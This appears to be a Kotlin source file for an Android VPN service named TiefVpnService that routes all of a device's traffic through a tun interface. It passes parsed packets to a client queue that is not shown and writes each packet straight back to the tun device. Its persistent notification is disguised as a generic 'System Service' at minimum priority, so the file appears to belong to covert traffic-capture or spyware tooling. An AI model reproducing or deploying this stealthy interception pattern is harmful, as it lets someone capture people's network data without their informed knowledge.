package com.tief.agent

import android.app.Notification
import android.app.PendingIntent
import android.content.Intent
import android.net.VpnService
import android.os.ParcelFileDescriptor
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.FileInputStream
import java.io.FileOutputStream

class TiefVpnService : VpnService() {
    private var tun: ParcelFileDescriptor? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (running) return START_STICKY
        startForeground(0x7F01, buildNotification())
        running = true
        scope.launch { loop() }
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, "sync")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private suspend fun loop() = withContext(Dispatchers.IO) {
        val builder = Builder()
            .setSession("TIEF")
            .addAddress("10.8.0.2", 32)
            .addRoute("0.0.0.0", 0)
            .addDnsServer("10.8.0.1")
            .setBlocking(true)
            .setMtu(1500)
        try {
            builder.addDisallowedApplication(packageName)
        } catch (_: Exception) {
        }
        tun = builder.establish() ?: return@withContext

        val fd = tun!!.fileDescriptor
        val input = FileInputStream(fd)
        val output = FileOutputStream(fd)
        val buf = ByteArray(32767)

        while (running && isActive) {
            val n = try {
                input.read(buf)
            } catch (e: Exception) {
                break
            }
            if (n <= 0) continue
            PacketParser.parse(buf, n)?.let { TiefClient.enqueue(it) }
            try {
                output.write(buf, 0, n)
            } catch (_: Exception) {
                break
            }
        }
        closeTun()
    }

    private fun closeTun() {
        try {
            tun?.close()
        } catch (_: Exception) {
        }
        tun = null
        running = false
    }

    override fun onRevoke() {
        closeTun()
        stopSelf()
    }

    override fun onDestroy() {
        running = false
        scope.cancel()
        closeTun()
        super.onDestroy()
    }
}